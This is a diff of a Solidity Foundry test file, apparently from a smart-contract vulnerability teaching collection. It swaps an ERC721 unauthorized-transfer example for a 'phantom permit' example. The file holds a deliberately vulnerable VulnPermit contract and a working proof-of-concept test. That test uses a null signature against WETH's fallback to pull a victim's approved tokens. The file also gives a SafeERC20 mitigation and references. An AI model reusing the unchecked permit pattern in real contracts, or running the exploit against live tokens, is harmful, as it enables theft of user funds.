@@ -2,113 +2,220 @@
 pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
-import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
-import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 /*
-Name: Unauthorized NFT Transfer in custom ERC721 implementation.
+Name: Phantom function - Permit Function 
 
 Description:
-Custom transferFrom function in contract VulnerableERC721, 
-does not properly check if msg.sender is the current owner of the token or an approved address.
-As a result, any address can call the transferFrom function to transfer any token, 
-regardless of who the current owner is. 
-This allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.
+Phantom function: Accepts any call to a function that it doesn't actually define, without reverting.
+key:
+1.Token that does not support EIP-2612 permit. 
+2.Token has a fallback function.
+For example: WETH.
 
- 
 Mitigation:  
-To ensure that msg.sender is the current owner of the token or an approved address.
+Use SafeERC20's safePermit - Revert on invalid signature.
+https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24
 
 REF:
-https://twitter.com/1nf0s3cpt/status/1679120390281412609
-https://blog.decurity.io/scanning-for-vulnerable-erc721-implementations-fe19200b91b5
-https://ventral.digital/posts/2022/8/18/sznsdaos-bountyboard-unauthorized-transferfrom-vulnerability
-https://github.com/pessimistic-io/slitherin/blob/master/docs/nft_approve_warning.md
+https://twitter.com/1nf0s3cpt/status/1671347058568237057
+https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f
 */
 
 contract ContractTest is Test {
-    VulnerableERC721 VulnerableERC721Contract;
-    FixedERC721 FixedERC721Contract;
-    address alice = vm.addr(1);
-    address bob = vm.addr(2);
+    VulnPermit VulnPermitContract;
+    WETH9 WETH9Contract;
 
     function setUp() public {
-        VulnerableERC721Contract = new VulnerableERC721();
-        VulnerableERC721Contract.safeMint(alice, 1);
-        FixedERC721Contract = new FixedERC721();
-        FixedERC721Contract.safeMint(alice, 1);
+        WETH9Contract = new WETH9();
+        VulnPermitContract = new VulnPermit(IERC20(address(WETH9Contract)));
     }
 
-    function testVulnerableERC721() public {
-        VulnerableERC721Contract.ownerOf(1);
-        vm.prank(bob);
-        VulnerableERC721Contract.transferFrom(address(alice), address(bob), 1);
+    function testVulnPhantomPermit() public {
+        address alice = vm.addr(1);
+        vm.deal(address(alice), 10 ether);
 
-        console.log(VulnerableERC721Contract.ownerOf(1));
+        vm.startPrank(alice);
+        WETH9Contract.deposit{value: 10 ether}();
+        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);
+        vm.stopPrank();
+        console.log(
+            "start WETH balanceOf this",
+            WETH9Contract.balanceOf(address(this))
+        );
+
+        VulnPermitContract.depositWithPermit(
+            address(alice),
+            1000,
+            27,
+            0x0,
+            0x0
+        );
+        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));
+        console.log("WETH balanceOf VulnPermitContract", wbal);
+
+        VulnPermitContract.withdraw(1000);
+
+        wbal = WETH9Contract.balanceOf(address(this));
+        console.log("WETH9Contract balanceOf this", wbal);
     }
 
-    function testFixedERC721() public {
-        FixedERC721Contract.ownerOf(1);
-        vm.prank(bob);
-        vm.expectRevert();
-        FixedERC721Contract.transferFrom(address(alice), address(bob), 1);
-        console.log(VulnerableERC721Contract.ownerOf(1));
+    receive() external payable {}
+}
+
+contract VulnPermit {
+    IERC20 public token;
+
+    constructor(IERC20 _token) {
+        token = _token;
+    }
+
+    function deposit(uint256 amount) public {
+        require(
+            token.transferFrom(msg.sender, address(this), amount),
+            "Transfer failed"
+        );
+    }
+
+    function depositWithPermit(
+        address target,
+        uint256 amount,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) public {
+        (bool success, ) = address(token).call(
+            abi.encodeWithSignature(
+                "permit(address,uint256,uint8,bytes32,bytes32)",
+                target,
+                amount,
+                v,
+                r,
+                s
+            )
+        );
+        require(success, "Permit failed");
+
+        require(
+            token.transferFrom(target, address(this), amount),
+            "Transfer failed"
+        );
+    }
+
+    function withdraw(uint256 amount) public {
+        require(token.transfer(msg.sender, amount), "Transfer failed");
+    }
+}
+
+// contract Permit {
+//     IERC20 public token;
+
+//     constructor(IERC20 _token) {
+//         token = _token;
+//     }
+
+//     function deposit(uint256 amount) public {
+//         require(
+//             token.transferFrom(msg.sender, address(this), amount),
+//             "Transfer failed"
+//         );
+//     }
+
+//     function depositWithPermit(
+//         address target,
+//         uint256 amount,
+//         uint8 v,
+//         bytes32 r,
+//         bytes32 s
+//     ) public {
+//         (bool success, ) = address(token).call(
+//             abi.encodeWithSignature(
+//                 "permit(address,uint256,uint8,bytes32,bytes32)",
+//                 target,
+//                 amount,
+//                 v,
+//                 r,
+//                 s
+//             )
+//         );
+//         require(success, "Permit failed");
+
+//         require(
+//             token.transferFrom(target, address(this), amount),
+//             "Transfer failed"
+//         );
+//     }
+
+//     function withdraw(uint256 amount) public {
+//         require(token.transfer(msg.sender, amount), "Transfer failed");
+//     }
+// }
+
+contract WETH9 {
+    string public name = "Wrapped Ether";
+    string public symbol = "WETH";
+    uint8 public decimals = 18;
+
+    event Approval(address indexed src, address indexed guy, uint wad);
+    event Transfer(address indexed src, address indexed dst, uint wad);
+    event Deposit(address indexed dst, uint wad);
+    event Withdrawal(address indexed src, uint wad);
+
+    mapping(address => uint) public balanceOf;
+    mapping(address => mapping(address => uint)) public allowance;
+
+    fallback() external payable {
+        deposit();
     }
 
     receive() external payable {}
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) external pure returns (bytes4) {
-        return this.onERC721Received.selector;
+    function deposit() public payable {
+        balanceOf[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
     }
-}
 
-contract VulnerableERC721 is ERC721, Ownable {
-    constructor() ERC721("MyNFT", "MNFT") {}
+    function withdraw(uint wad) public {
+        require(balanceOf[msg.sender] >= wad);
+        balanceOf[msg.sender] -= wad;
+        payable(msg.sender).transfer(wad);
+        emit Withdrawal(msg.sender, wad);
+    }
 
-    //custom transferFrom function which missing NFT owner check.
+    function totalSupply() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    function approve(address guy, uint wad) public returns (bool) {
+        allowance[msg.sender][guy] = wad;
+        emit Approval(msg.sender, guy, wad);
+        return true;
+    }
+
+    function transfer(address dst, uint wad) public returns (bool) {
+        return transferFrom(msg.sender, dst, wad);
+    }
+
     function transferFrom(
-        address from,
-        address to,
-        uint256 tokenId
-    ) public override {
-        // direct transfer
-        _transfer(from, to, tokenId);
-    }
+        address src,
+        address dst,
+        uint wad
+    ) public returns (bool) {
+        require(balanceOf[src] >= wad);
 
-    function safeMint(address to, uint256 tokenId) public onlyOwner {
-        _safeMint(to, tokenId);
-    }
-}
+        if (
+            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
+        ) {
+            require(allowance[src][msg.sender] >= wad);
+            allowance[src][msg.sender] -= wad;
+        }
 
-contract FixedERC721 is ERC721, Ownable {
-    constructor() ERC721("MyNFT", "MNFT") {}
+        balanceOf[src] -= wad;
+        balanceOf[dst] += wad;
 
-    //Mitigation: add token owner check
-    function transferFrom(
-        address from,
-        address to,
-        uint256 tokenId
-    ) public override {
-        require(
-            _isApprovedOrOwner(_msgSender(), tokenId),
-            "ERC721: caller is not token owner or approved"
-        );
+        emit Transfer(src, dst, wad);
 
-        _transfer(from, to, tokenId);
+        return true;
     }
-
-    function safeMint(address to, uint256 tokenId) public onlyOwner {
-        _safeMint(to, tokenId);
-    }
-    /*
-    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {
-        address owner = ERC721.ownerOf(tokenId);
-        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);
-    }
-*/
 }
